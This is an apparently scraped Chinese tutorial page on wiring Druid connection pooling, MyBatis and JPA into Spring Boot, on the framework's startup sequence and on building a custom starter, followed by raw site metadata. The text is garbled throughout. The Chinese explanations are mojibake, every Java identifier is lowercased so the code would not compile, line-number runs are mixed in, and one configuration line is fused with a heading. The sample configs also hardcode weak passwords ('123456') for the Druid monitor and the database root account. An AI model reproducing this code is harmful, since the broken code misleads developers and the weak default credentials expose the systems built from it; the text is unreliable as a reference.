}\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\néç½®druidççæ§\n\npackage com.pwddd.jdbc.config;\n\nimport com.alibaba.druid.pool.druiddatasource;\nimport com.alibaba.druid.support.http.statviewservlet;\nimport com.alibaba.druid.support.http.webstatfilter;\nimport org.springframework.boot.context.properties.configurationproperties;\nimport org.springframework.boot.web.servlet.filterregistrationbean;\nimport org.springframework.boot.web.servlet.servletregistrationbean;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\nimport javax.sql.datasource;\nimport java.util.arrays;\nimport java.util.hashmap;\n\n@configuration\npublic class druidconfig {\n\n  @configurationproperties(prefix = "spring.datasource.druid")\n  @bean\n  public datasource druiddatasource(){\n    return new druiddatasource();\n  }\n\n  @bean\n  public servletregistrationbean statviewservlet(){\n\n    servletregistrationbean registrationbean = new servletregistrationbean(new statviewservlet(), "/druid/*");\n    hashmap<string, string> map = new hashmap<>();\n    map.put("loginusername","admin");\n    map.put("loginpassword","123456");\n    registrationbean.setinitparameters(map);\n    return registrationbean;\n  }\n\n  @bean\n  public filterregistrationbean webstatfilter(){\n    filterregistrationbean registrationbean = new filterregistrationbean(new webstatfilter());\n    hashmap<string, string> initparameters = new hashmap<>();\n    initparameters.put("exclusions","*.js,*.css,*.html,/druid/*");\n    registrationbean.setinitparameters(initparameters);\n    registrationbean.seturlpatterns(arrays.aslist("/*"));\n    return registrationbean;\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# æ´åmybatis\n\n 1. å¼å¥ç¸å³ä¾èµï¼\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n  <modelversion>4.0.0</modelversion>\n\n  <groupid>com.pwddd.mybatis</groupid>\n  <artifactid>springboot-mybatis</artifactid>\n  <version>1.0-snapshot</version>\n\n  <parent>\n    <artifactid>spring-boot-starter-parent</artifactid>\n    <groupid>org.springframework.boot</groupid>\n    <version>1.5.9.release</version>\n  </parent>\n\n  <properties>\n    <maven.compiler.source>8</maven.compiler.source>\n    <maven.compiler.target>8</maven.compiler.target>\n  </properties>\n\n  <dependencies>\n    <dependency>\n      <groupid>org.springframework.boot</groupid>\n      <artifactid>spring-boot-starter-web</artifactid>\n    </dependency>\n\n    <dependency>\n      <groupid>org.springframework.boot</groupid>\n      <artifactid>spring-boot-starter-test</artifactid>\n      <scope>test</scope>\n    </dependency>\n\n    <dependency>\n      <groupid>mysql</groupid>\n      <artifactid>mysql-connector-java</artifactid>\n      <version>8.0.28</version>\n      <scope>runtime</scope>\n    </dependency>\n\n    <dependency>\n      <groupid>com.alibaba</groupid>\n      <artifactid>druid</artifactid>\n      <version>1.2.8</version>\n    </dependency>\n\n    <dependency>\n      <groupid>org.mybatis.spring.boot</groupid>\n      <artifactid>mybatis-spring-boot-starter</artifactid>\n      <version>2.2.2</version>\n    </dependency>\n  </dependencies>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n 2. éç½®druidæ°æ®æº\n\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.driver\nspring.datasource.url=jdbc:mysql://localhost:3307/springboot\nspring.datasource.username=root\nspring.datasource.password=123456\nspring.datasource.type=com.alibaba.druid.pool.druiddatasource\nspring.datasource.schema=classpath:sql/schema-all.sql\nspring.datasource.data=classpath:sql/data-all.sql\n\n# druidéç½®\nspring.datasource.initialsize: 5\nspring.datasource.min-idle=5\nspring.datasource.max-active=20\nspring.datasource.max-wait=60000\nspring.datasource.time-between-eviction-runs-millis=6000\nspring.datasource.min-evictable-idle-time-millis=300000\nspring.datasource.validation-query=select 1 from dual\nspring.datasource.test-while-idle=false\nspring.datasource.test-on-return=false\nspring.datasource.pool-prepared-statements=true\n\nspring.datasource.druid.filters=stat,wall,log4j\nspring.datasource.druid.max-pool-prepared-statement-per-connection-size=20\nspring.datasource.druid.use-global-data-source-stat=true\nspring.datasource.druid.connection-properties=druid.stat.mergesql=true;druid.stat.slowsqlmillis=500\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\npackage com.pwddd.mybatis.config;\n\nimport com.alibaba.druid.pool.druiddatasource;\nimport com.alibaba.druid.support.http.statviewfilter;\nimport com.alibaba.druid.support.http.statviewservlet;\nimport com.alibaba.druid.support.http.webstatfilter;\nimport org.springframework.boot.context.properties.configurationproperties;\nimport org.springframework.boot.web.servlet.filterregistrationbean;\nimport org.springframework.boot.web.servlet.servletregistrationbean;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\nimport javax.sql.datasource;\nimport java.util.arrays;\nimport java.util.hashmap;\n\n@configuration\npublic class druidconfig {\n\n    @configurationproperties("spring.datasource")\n    @bean\n    public datasource datasource(){\n        return new druiddatasource();\n    }\n\n    @bean\n    public servletregistrationbean statviewservlet(){\n        servletregistrationbean registrationbean =\n                new servletregistrationbean(new statviewservlet(),"/druid/*");\n        hashmap<string, string> map = new hashmap<>();\n        map.put("loginusername","admin");\n        map.put("loginpassword","123456");\n        registrationbean.setinitparameters(map);\n        return registrationbean;\n    }\n\n    @bean\n    public filterregistrationbean statfilter(){\n        webstatfilter filter = new webstatfilter();\n        filterregistrationbean bean = new filterregistrationbean(filter);\n        hashmap<string, string> initparameters = new hashmap<>();\n        initparameters.put("exclusions","*.js,*.html,*.css,/druid/*");\n        bean.setinitparameters(initparameters);\n        bean.seturlpatterns(arrays.aslist("/*"));\n        return bean;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n 3. åå»ºjavabean\n\npackage com.pwddd.mybatis.bean;\n\nimport lombok.allargsconstructor;\nimport lombok.data;\nimport lombok.noargsconstructor;\n\n@data\n@allargsconstructor\n@noargsconstructor\npublic class admin {\n  private string id;\n  private string username;\n  private string passwd;\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n 4. åå»ºmapperåå¯¹åºçæ¥å£\n\npackage com.pwddd.mybatis.mapper;\n\nimport com.pwddd.mybatis.bean.admin;\nimport org.apache.ibatis.annotations.mapper;\n\nimport java.util.list;\n\n@mapper\npublic interface adminmapper {\n\n  list<admin> list();\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n<?xml version="1.0" encoding="utf-8" ?>\n<!doctype mapper public "-//mybatis.org//dtd mapper 3.0//en"\n        "http://mybatis.org/dtd/mybatis-3-mapper.dtd" >\n<mapper namespace="com.pwddd.mybatis.mapper.adminmapper">\n\n  <select id="list" resulttype="admin">\n    select * from t_admin\n  </select>\n</mapper>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n 5. æ·»å éç½®\n\nmybatis.mapper-locations=classpath:mapper/*.xml\nmybatis.type-aliases-package=com.pwddd.mybatis.beæ³¨å¥mapper\n\n\n1\n2\n\n\n@restcontroller\n@requestmapping("/admin")\npublic class admincontroller {\n\n  @autowired\n  private adminmapper adminmapper;\n\n  @requestmapping("/list")\n  public list<admin> adminlist(){\n    return adminmapper.list();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n 6. æ¹éæ«æå\n\n@springbootapplication\n@mapperscan(basepackages = "com.pwddd.mybatis.mapper")\npublic class mybatisapplication {\n  public static void main(string[] args) {\n    springapplication.run(mybatisapplication.class,args);\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 7. èªå®ä¹myabtiséç½®\n\nspringbootéç½®mybatisä¹æ¯ä½¿ç¨èªå¨éç½®å®æçãå¨åå»ºsql sessionfactoryæ¶ä¼è·åææçconfigurationï¼å æ­¤æä»¬åªéè¦èªå®ä¹ä¸ä¸ªconfigurationcustomizerï¼ç¶åå å¥å°å®¹å¨ä¸­å³å¯ã\n\npackage com.pwddd.mybatis.config;\n\nimport org.mybatis.spring.boot.autoconfigure.configurationcustomizer;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\n@configuration\npublic class mybatisconfig {\n\n  @bean\n  public configurationcustomizer configurationcustomizer(){\n    return new configurationcustomizer() {\n\n      @override\n      public void customize(org.apache.ibatis.session.configuration configuration) {\n        configuration.setaggressivelazyloading(true);\n      }\n    };\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\næºç ï¼\n\nprivate void applyconfiguration(sqlsessionfactorybean factory) {\n  org.apache.ibatis.session.configuration configuration = this.properties.getconfiguration();\n  if (configuration == null && !stringutils.hastext(this.properties.getconfiglocation())) {\n    configuration = new org.apache.ibatis.session.configuration();\n  }\n\n  if (configuration != null && !collectionutils.isempty(this.configurationcustomizers)) {\n    iterator var3 = this.configurationcustomizers.iterator();\n\n    while(var3.hasnext()) {\n      configurationcustomizer customizer = (configurationcustomizer)var3.next();\n      customizer.customize(configuration);\n    }\n  }\n\n  factory.setconfiguration(configuration);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n 8. éç½®å¨å±éç½®æä»¶\n\nmybatis.config-location=classpath:mybatis-config.xml\n\n\n1\n\n\n\n# æ´åjpa\n\n# springdataç®ä»\n\n\n\nåºç¨ç¨åºé¢åspringdataç¼ç¨ï¼ç±springdataå¸®å©æä»¬å®æå·ä½çå®ç°ã\n\n# æ´åæ¹æ³\n\n 1. åå»ºé¡¹ç®ï¼å¼å¥spring-boot-starter-jpa\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n  <modelversion>4.0.0</modelversion>\n\n  <groupid>com.pwddd.jpa</groupid>\n  <artifactid>springboot-jpa</artifactid>\n  <version>1.0-snapshot</version>\n\n  <parent>\n    <artifactid>spring-boot-starter-parent</artifactid>\n    <groupid>org.springframework.boot</groupid>\n    <version>1.5.9.release</version>\n  </parent>\n\n  <properties>\n    <maven.compiler.source>8</maven.compiler.source>\n    <maven.compiler.target>8</maven.compiler.target>\n  </properties>\n\n  <dependencies>\n    <dependency>\n      <groupid>org.springframework.boot</groupid>\n      <artifactid>spring-boot-starter-data-jpa</artifactid>\n    </dependency>\n\n    <dependency>\n      <groupid>mysql</groupid>\n      <artifactid>mysql-connector-java</artifactid>\n      <version>8.0.28</version>\n    </dependency>\n\n    <dependency>\n      <groupid>org.springframework.boot</groupid>\n      <artifactid>spring-boot-starter-jdbc</artifactid>\n    </dependency>\n\n    <dependency>\n      <groupid>org.springframework.boot</groupid>\n      <artifactid>spring-boot-starter-web</artifactid>\n    </dependency>\n  </dependencies>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n 2. åå»ºéç½®æä»¶\n\nspring:\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.driver\n    password: 123456\n    username: root\n    url: jdbc:mysql://localhost:3307/springboot\n\n\n1\n2\n3\n4\n5\n6\n\n 3. ç¼åå®ä½ç±»ï¼éç½®æ å°å³ç³»\n\npackage com.pwddd.jpa.entity;\n\nimport lombok.allargsconstructor;\nimport lombok.data;\nimport lombok.noargsconstructor;\n\nimport javax.persistence.*;\nimport javax.persistence.criteria.criteriabuilder;\n\n@data\n@allargsconstructor\n@noargsconstructor\n@entity // éç½®æ è¯\n@table(name = "t_admin") // éç½®æ°æ®è¡¨\npublic class admin {\n    @id\n    @generatedvalue(strategy = generationtype.identity) // èªå¢ä¸»é®\n    private integer id;\n\n    @column(name = "user_name",length = 255)\n    private string username;\n    @column(length = 255)\n    private string passwd;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 4. ç¼åæ¥å£æä½æ°æ®\n\npackage com.pwddd.jpa.repository;\n\nimport com.pwddd.jpa.entity.admin;\nimport org.springframework.data.jpa.repository.jparepository;\n//                                                    æä½çå®ä½ï¼ä¸»é®ç±»å\npublic interface adminrepository extends jparepository<admin,string> {\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 5. éç½®jpa\n\njpa:\n\thibernate:\n\t\tddl-auto: update # æ´æ°æèåå»ºè¡¨ç»æ\n\tshow-sql: true # æ¾ç¤ºæ¥è¯¢\n\n\n1\n2\n3\n4\n\n 6. æ³¨å¥repository\n\npackage com.pwddd.jpa.controller;\n\nimport com.pwddd.jpa.entity.admin;\nimport com.pwddd.jpa.repository.adminrepository;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.web.bind.annotation.requestmapping;\nimport org.springframework.web.bind.annotation.restcontroller;\n\n@restcontroller\n@requestmapping("/admin")\npublic class admincontroller {\n\n    @autowired\n    private adminrepository repository;\n\n    @requestmapping("/add")\n    public void addadmin(admin admin){\n        repository.save(admin);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# springboot å¯å¨éç½®åç\n\n\n# å¯å¨æµç¨ï¼\n\n * åå»ºspringapplicationå¯¹è±¡\n\n * è°ç¨initializeæ¹æ³\n\n    private void initialize(object[] sources) {\n        if (sources != null && sources.length > 0) {\n            this.sources.addall(arrays.aslist(sources));\n        }\n\t\t\t// å¤æ­æ¯å¦ä¸ºwebåºç¨\n        this.webenvironment = this.deducewebenvironment();\n      \n      // ç±»è·¯å¾ä¸å¯»æ¾applicationinitalizerä¿å­\n      this.setinitializers(this.getspringfactoriesinstances(applicationcontextinitializer.class));\n      // ç±»è·¯å¾ä¸å¯»æ¾  applicationlistener å¹¶ä¿å­\n      this.setlisteners(this.getspringfactoriesinstances(applicationlistener.class));\n      // å¤ä¸ªéç½®ç±»ä¸­æ¾å°æmainæ¹æ³çéç½®ç±»ã \n      this.mainapplicationclass = this.deducemainapplicationclass();\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n * è¿è¡runæ¹æ³\n\npublic configurableapplicationcontext run(string... args) {\n        stopwatch stopwatch = new stopwatch();\n        stopwatch.start();\n        configurableapplicationcontext context = null;\n        failureanalyzers analyzers = null;\n        this.configureheadlessproperty();\n  // \tè·åspringapplicationrunlistener ä»ç±»è·¯å¾ä¸çmate-inf/spring.factorieséå¯»æ¾\n        springapplicationrunlisteners listeners = this.getrunlisteners(args);\n  \n  \t\t// åææælistenerçstartingæ¹æ³\n        listeners.starting();\n\n        try {\n          // å°è£args\n            applicationarguments applicationarguments = new defaultapplicationarguments(args);\n          \t// åå¤ç¯å¢ï¼ åå»ºç¯å¢  éç½®ç¯å¢  åè°listenerçenvironmentprepared  æ¹æ³\n          configurableenvironment environment = this.prepareenvironment(listeners, applicationarguments);\n          \t// æå°å¯å¨æ¶çbanner \n          banner printedbanner = this.printbanner(environment);\n            \n          \t// åå»ºcontext iocå®¹å¨\n          context = this.createapplicationcontext();\n            \n          new failureanalyzers(context);\n          // åå¤ä¸ä¸æç¯å¢\n       \t\t\t// å°envä¿å­å°iocï¼è·åææçapplicationinitalizer è°ç¨initailzeæ¹æ³ ï¼ åè°æælistenerçcontextpreparedæ¹æ³ã æååè° listenerçcontextloadedæ¹æ³\n          this.preparecontext(context, environment, liteners, applicationarguments, printedbanner);\n\t\t\t\t// å·çº¿å®¹å¨ iocå®¹å¨åå§å\n          this.refreshcontext(context);\n          // callrunner è·åææçapplicationrunner ã ç¶åè·åææçcommandlinerunner å¹¶è¿è¡ä»ä»¬çrunæ¹æ³\n            this.afterrefresh(context, applicationarguments);\n          // åè°listenerçfinishedæ¹æ³\n            listeners.finished(context, (throwable)null);\n            stopwatch.stop();\n            if (this.logstartupinfo) {\n                (new startupinfologger(this.mainapplicationclass)).logstarted(this.getapplicationlog(), stopwatch);\n            }\n// è¿åiocå®¹å¨\n            return context;\n        } catch (throwable var9) {\n            this.handlerunfailure(context, listeners, (failureanalyzers)analyzers, var9);\n            throw new illegalstateexception(var9);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n\n\n\n# äºä»¶çå¬æºå¶\n\nå ä¸ªéè¦çäºä»¶åè°æºå¶\n\néç½®å¨meta-inf/spring.factories\n\napplicationcontextinitializer\n\nspringapplicationrunlistener\n\nåªéè¦æ¾å¨iocå®¹å¨ä¸­\n\napplicationrunner\n\ncommandlinerunner\n\n\n# springbootèªå®ä¹starter\n\nstarteråºæ¯å¯å¨å¨ï¼\n\n 1. éè¦å¯¼å¥çä¾èµ\n\n 2. å¦ä½ç¼åèªå¨éç½®\n\n@configuration //æå®è¿ä¸ªç±»æ¯ä¸ä¸ªéç½®ç±» \n@conditionalonxxx //å¨æå®æ¡ä»¶æç«çæåµä¸èªå¨éç½®ç±»çæ \n@autoconfigureafter //æå®èªå¨éç½®ç±»çé¡ºåº \n@bean //ç»å®¹å¨ä¸­æ·»å ç»ä»¶\n\n@configurationpropertie//ç»åç¸å³xxxpropertiesç±»æ¥ç»å®ç¸å³çéç½®\n@enableconfigurationproperties //è®©xxxpropertiesçæå å¥å°å®¹å¨ä¸­\n\nèªå¨éç½®ç±»è¦è½å è½½ å°éè¦å¯å¨å°±å è½½çèªå¨éç½®ç±»ï¼éç½®å¨metaâinf/spring.factories org.springframework.boot.autoconfigure.enableautoconfiguration=\\ org.springframework.boot.autoconfigure.admin.springapplicationadminjmxautoconfiguration,\\ org.springframework.boot.autoconfigure.aop.aopautoconfiguration,\\\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n\n\n# æ­¥éª¤\n\n 1. åå»ºä¸¤ä¸ªmavené¡¹ç®\n\n<project xmlns="http://maven.apache.org/pom/4.0.0" xmlns:xsi="http://www.w3.org/2001/xmlschemaâinstance" xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/mavenâ4.0.0.xsd"> <modelversion>4.0.0</modelversion>\n\n<groupid>com.atguigu.starter</groupid> \n  <artifactid>atguiguâspringâbootâstarter</artifactid> \n  <version>1.0âsnapshot</version>\n\n<!ââå¯å¨å¨ââ> \n  <dependencies>\n\n<!ââå¼å¥èªå¨éç½®æ¨¡åââ> \n    <dependency> \n      <groupid>com.atguigu.starter</groupid> \n      <artifactid>atguiguâspringâbootâstarterâautoconfigurer</artifactid> \n      <version>0.0.1âsnapshot</version> \n    </dependency> \n  </dependencies>\n\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n<?xml version="1.0" encoding="utfâ8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0" xmlns:xsi="http://www.w3.org/2001/xmlschemaâinstance"\n\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven4.0.0.xsd">\n\n    <modelversion>4.0.0</modelversion>\n\n    <groupid>com.atguigu.starter</groupid>\n    <artifactid>atguiguâspringâbootâstarterâautoconfigurer</artifactid>\n    <version>0.0.1âsnapshot</version>\n    <packaging>jar</packaging>\n\n    <name>atguiguâspringâbootâstarterâautoconfigurer</name>\n    <description>demo project for spring boot</description>\n\n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>springâbootâstarterâparent</artifactid>\n        <version>1.5.10.release</version>\n        <relativepath/>\n        <!ââ lookup parent from repository ââ>\n    </parent>\n\n    <properties>\n        <project.build.sourceencoding>utfâ8</project.build.sourceencoding>\n        <project.reporting.outputencoding>utfâ8</project.reporting.outputencoding>\n        <java.version>1.8</java.version>\n    </properties>\n\n    <dependencies>\n\n        <!ââå¼å¥springâbootâstarterï¼ææstarterçåºæ¬éç½®ââ>\n        <dependency>\n\n            <groupid>org.springframework.boot</groupid>\n\n            <artifactid>springâbootâstarter</artifactid>\n        </dependency>\n\n    </dependencies>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\nèªå®ä¹properties\n\npackage com.atguigu.starter;\n\nimport org.springframework.boot.context.properties.configurationproperties;\n\n@configurationproperties(prefix = "atguigu.hello")\npublic class helloproperties {\nprivate string prefix; \n  private string suffix;\n\npublic string getprefix() { return prefix; }\n\npublic void setprefix(string prefix) { this.prefix = prefix; }\n\npublic string getsuffix() { return suffix; }\n\npublic void setsuffix(string suffix) { this.suffix = suffix; }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nèªå®ä¹service\n\npackage com.atguigu.starter;\n\npublic class helloservice {\n\nhelloproperties helloproperties;\n\npublic helloproperties gethelloproperties() { return helloproperties; }\n\npublic void sethelloproperties(helloproperties helloproperties) { this.helloproperties = helloproperties; }\n\npublic string sayhellatguigu(string name){ \n  return helloproperties.getprefix()+"â" +name + helloproperties.getsuffix(); }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nèªå¨éç½®\n\npackage com.atguigu.starter;\n\nimport org.springframework.beans.factory.annotation.autowired; import org.springframework.boot.autoconfigure.condition.conditionalonwebapplication; import org.springframework.boot.context.properties.enableconfigurationproperties; import org.springframework.context.annotation.bean; import org.springframework.context.annotation.configuration;\n\n@configuration\n@conditionalonwebapplication //webåºç¨æçæ @enableconfigurationproperties(helloproperties.class) \npublic class helloserviceautoconfiguration {\n\n  @autowired helloproperties helloproperties; \n  @bean \n  public helloservice helloservice(){\n\n    helloservice service = new helloservice();\n\n    service.sethelloproperties(helloproperties);\n\n    return service; \n  }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',charsets:{cjk:!0},lastUpdated:"2022/04/27, 19:18:16",lastUpdatedTimestamp:1651087096e3},{title:"Docker",frontmatter:{title:"Docker",date:"2022-05-01T14:00:00.000Z",permalink:"/dev/java/eco/docker",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","å¾®æå¡çæ"],tags:["K8S","Docker","DockerCompose"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1012.%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%94%9F%E6%80%81/00.Docker.html",relativePath:"01.å¼å/101.åç«¯/1012.å¾®æå¡çæ/00.Docker.md",key:"v-63e88fe4",path:"/dev/java/eco/docker/",headers:[{level:2,title:"Docker çå¿µ",slug:"docker-çå¿µ",normalizedTitle:"docker çå¿µ",charIndex:13},{level:2,title:"Linuxå®¹å¨çå®ç°æ¹å¼",slug:"linuxå®¹å¨çå®ç°æ¹å¼",normalizedTitle:"linuxå®¹å¨çå®ç°æ¹å¼",charIndex:204},{level:3,title:"NameSpace",slug:"namespace",normalizedTitle:"namespace",charIndex:694},{level:3,title:"Cgroups",slug:"cgroups",normalizedTitle:"cgroups",charIndex:289},{level:3,title:"Chroot",slug:"chroot",normalizedTitle:"chroot",charIndex:1993},{level:2,title:"Dockeråèææºçåºå«",slug:"dockeråèææºçåºå«",normalizedTitle:"dockeråèææºçåºå«",charIndex:2139},{level:3,title:"èææº",slug:"èææº",normalizedTitle:"èææº",charIndex:1272},{level:3,title:"Docker",slug:"docker-2",normalizedTitle:"docker",charIndex:2},{level:2,title:"Dockerçä¼å¿",slug:"dockerçä¼å¿",normalizedTitle:"dockerçä¼å¿",charIndex:2710},{level:2,title:"ç¸å³æ¦å¿µ",slug:"ç¸å³æ¦å¿µ",normalizedTitle:"ç¸å³æ¦å¿µ",charIndex:3149},{level:3,title:"éå",slug:"éå",normalizedTitle:"éå",charIndex:585},{level:3,title:"å®¹å¨",slug:"å®¹å¨",normalizedTitle:"å®¹å¨",charIndex:170},{level:3,title:"ä»åº",slug:"ä»åº",normalizedTitle:"ä»åº",charIndex:3909},{level:2,title:"Centoså®è£Docker",slug:"centoså®è£docker",normalizedTitle:"centoså®è£docker",charIndex:4127},{level:3,title:"1. å¸è½½æ§çæ¬Docker",slug:"_1-å¸è½½æ§çæ¬docker",normalizedTitle:"1. å¸è½½æ§çæ¬docker",charIndex:4146},{level:3,title:"2. è®¾ç½®éåä»åº",slug:"_2-è®¾ç½®éåä»åº",normalizedTitle:"2. è®¾ç½®éåä»åº",charIndex:4466},{level:3,title:"3. å®è£Docker",slug:"_3-å®è£docker",normalizedTitle:"3. å®è£docker",charIndex:4625},{level:3,title:"4. éç½®éåå é",slug:"_4-éç½®éåå é",normalizedTitle:"4. éç½®éåå é",charIndex:4725},{level:3,title:"5. å¯å¨Dockerå¹¶æµè¯",slug:"_5-å¯å¨dockerå¹¶æµè¯",normalizedTitle:"5. å¯å¨dockerå¹¶æµè¯",charIndex:5646},{level:3,title:"6. Docker Runé»è¾å¾",slug:"_6-docker-runé»è¾å¾",normalizedTitle:"6. docker runé»è¾å¾",charIndex:5726},{level:3,title:"99. å¸è½½æ¹å¼",slug:"_99-å¸è½½æ¹å¼",normalizedTitle:"99. å¸è½½æ¹å¼",charIndex:5749},{level:2,title:"Docker å¸¸ç¨å½ä»¤",slug:"docker-å¸¸ç¨å½ä»¤",normalizedTitle:"docker å¸¸ç¨å½ä»¤",charIndex:5842},{level:3,title:"å¸®å©ç¸å³",slug:"å¸®å©ç¸å³",normalizedTitle:"å¸®å©ç¸å³",charIndex:5860},{level:3,title:"éåç¸å³å½ä»¤",slug:"éåç¸å³å½ä»¤",normalizedTitle:"éåç¸å³å½ä»¤",charIndex:5962},{level:3,title:"å®¹å¨ç¸å³å½ä»¤",slug:"å®¹å¨ç¸å³å½ä»¤",normalizedTitle:"å®¹å¨ç¸å³å½ä»¤",charIndex:7104},{level:2,title:"éå",slug:"éå-2",normalizedTitle:"éå",charIndex:585},{level:3,title:"UnionFS - èåæä»¶ç³»ç»",slug:"unionfs-èåæä»¶ç³»ç»",normalizedTitle:"unionfs - èåæä»¶ç³»ç»",charIndex:10120},{level:3,title:"Dockeréåå è½½åç",slug:"dockeréåå è½½åç",normalizedTitle:"dockeréåå è½½åç",charIndex:10374},{level:3,title:"Docker commit",slug:"docker-commit",normalizedTitle:"docker commit",charIndex:10784},{level:2,title:"å®¹å¨æ°æ®å·",slug:"å®¹å¨æ°æ®å·",normalizedTitle:"å®¹å¨æ°æ®å·",charIndex:10981},{level:3,title:"å½ä»¤è¡åå»ºå®¹å¨æ°æ®å·",slug:"å½ä»¤è¡åå»ºå®¹å¨æ°æ®å·",normalizedTitle:"å½ä»¤è¡åå»ºå®¹å¨æ°æ®å·",charIndex:11325},{level:3,title:"Dockerfileåå»ºå®¹å¨æ°æ®å·",slug:"dockerfileåå»ºå®¹å¨æ°æ®å·",normalizedTitle:"dockerfileåå»ºå®¹å¨æ°æ®å·",charIndex:11480},{level:3,title:"æ°æ®å·å®¹å¨",slug:"æ°æ®å·å®¹å¨",normalizedTitle:"æ°æ®å·å®¹å¨",charIndex:11941},{level:2,title:"Dockerå®è£å¸¸è§çæå¡",slug:"dockerå®è£å¸¸è§çæå¡",normalizedTitle:"dockerå®è£å¸¸è§çæå¡",charIndex:12197},{level:3,title:"Docker å®è£ Mysql",slug:"docker-å®è£-mysql",normalizedTitle:"docker å®è£ mysql",charIndex:12215},{level:3,title:"Dockerå®è£Redis",slug:"dockerå®è£redis",normalizedTitle:"dockerå®è£redis",charIndex:13517},{level:3,title:"Docker å®è£ nginx",slug:"docker-å®è£-nginx",normalizedTitle:"docker å®è£ nginx",charIndex:14516},{level:3,title:"Docker å®è£ Tomcat",slug:"docker-å®è£-tomcat",normalizedTitle:"docker å®è£ tomcat",charIndex:15407},{level:3,title:"Docker å®è£ ES",slug:"docker-å®è£-es",normalizedTitle:"docker å®è£ es",charIndex:15776},{level:3,title:"Docker 